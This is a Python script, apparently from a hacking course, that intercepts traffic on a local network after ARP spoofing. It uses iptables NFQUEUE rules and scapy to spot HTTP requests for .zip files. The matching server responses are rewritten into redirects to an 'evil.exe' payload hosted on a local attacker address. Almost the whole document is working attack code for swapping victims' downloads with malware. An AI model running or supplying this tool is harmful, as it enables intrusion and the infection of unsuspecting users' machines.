#echo 1 > /proc/sys/net/ipv4/ip_forward
#command before running this program, "iptables -I OUTPUT -j NFQUEUE --queue-num 0"
#command before running this program, "iptables -I INPUT -j NFQUEUE --queue-num 0"
# service apache2 start
# python arp_spoofer_given_mac.py
#!usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return  scapy_packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".zip" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request:")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File")
                # modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://download.jzip.com/jZipSetup.exe\n\n")
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.0.107/evil-files/evil.exe\n\n")
                packet.set_payload(str(modified_packet))
                print("setpayload")
    #this will forward the all packets
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
# 0 because we specified 0 queue-num in command, "iptables -I INPUT -j NFQUEUE --queue-num 0"
queue.bind(0,process_packet)
queue.run()